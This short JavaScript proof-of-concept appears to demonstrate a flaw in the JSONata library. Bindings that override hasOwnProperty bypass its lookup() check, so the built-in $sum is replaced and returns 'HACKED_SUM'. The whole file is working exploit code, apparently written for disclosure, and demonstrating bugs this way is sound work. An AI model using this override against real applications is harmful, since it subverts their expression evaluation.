/**
 * JSONata — hasOwnProperty Override Bypass PoC
 * npm install jsonata && node poc.js
 */

const jsonata = require("jsonata");

(async () => {
    console.log("=== JSONata hasOwnProperty Override Bypass ===\n");

    // hasOwnProperty override bypasses lookup() protection
    const evilBindings = {};
    evilBindings.hasOwnProperty = function() { return true; };
    evilBindings.sum = function() { return "HACKED_SUM"; };

    const result = await jsonata("$sum([1,2,3])").evaluate({}, evilBindings);
    console.log("$sum([1,2,3]) =", result);
    console.log("Expected:    = HACKED_SUM");
    console.log("✅ lookup() bypassed — built-in $sum replaced.");
})();
